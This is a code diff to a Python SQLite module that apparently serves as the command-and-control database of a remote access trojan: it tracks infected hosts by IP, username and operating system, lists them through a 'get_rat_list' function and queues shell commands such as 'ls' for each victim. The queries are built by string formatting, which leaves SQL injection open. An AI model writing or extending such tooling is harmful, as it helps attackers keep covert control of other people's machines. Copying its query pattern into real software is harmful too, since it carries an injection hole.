@@ -1,11 +1,16 @@
 import sqlite3
 
+### TODO DISPLAY OPERATING SYSTEM IN DB
+
 # need to update for data created, indexes  #
 def create():
     db = sqlite3.connect('apext.db')
     db.execute(''' CREATE TABLE users (
     user_ip VARCHAR(32) NOT NULL,
-    username VARCHAR(32) NOT NULL
+    username VARCHAR(32) NOT NULL,
+    os VARCHAR(32)NOT NULL,
+    registered VARCHAR(32)NOT NULL,
+    last_seen VARCHAR(32)NOT NULL
     ); ''')
 
     db.execute(''' CREATE TABLE command (
@@ -20,9 +25,9 @@ def create():
     master_ip VARCHAR(32) NOT NULL
     ); ''')
 
-def register(ip, username):
+def register(ip, username, os, registered, last_seen):
     db = sqlite3.connect('apext.db')
-    db.execute("INSERT INTO users VALUES('{0}', '{1}');".format(ip, username))
+    db.execute("INSERT INTO users VALUES('{0}', '{1}', '{2}', '{3}', '{4}');".format(ip, username, os, registered, last_seen))
     db.commit()
     db.execute("INSERT INTO command VALUES('{0}', '{1}', '{2}');".format(ip, username, 'ls'))
     db.commit()
@@ -73,8 +78,8 @@ def remove_user_command(ip, username):
 def get_rat_list():
     db = sqlite3.connect('apext.db')
     cur = db.cursor()
-    cur.execute('SELECT user_ip, username FROM users ;')
-    return cur.fetchall()[0]
+    cur.execute('SELECT user_ip, username, os, registered, last_seen FROM users ;')
+    return cur.fetchall()
 
 def check_rat_existss(ip):
     print(ip)
